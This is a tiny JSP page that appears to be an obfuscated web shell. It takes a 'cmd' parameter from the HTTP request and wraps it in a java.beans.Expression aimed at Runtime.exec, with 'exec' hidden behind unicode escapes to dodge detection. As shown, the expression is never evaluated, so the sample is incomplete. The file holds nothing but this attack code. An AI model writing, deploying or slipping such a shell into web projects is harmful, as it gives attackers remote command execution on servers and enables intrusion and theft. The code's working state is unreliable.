<%@ page import="java.beans.Expression"%>
<%@ page contentType="text/html; charset=UTF-8" language="java" %>
<%
    String payload =request.getParameter("cmd");
    Expression expression = new Expression(Runtime.getRuntime(),"\u0065"+"\u0078"+"\u0065"+"\u0063",new Object[]{payload});
%>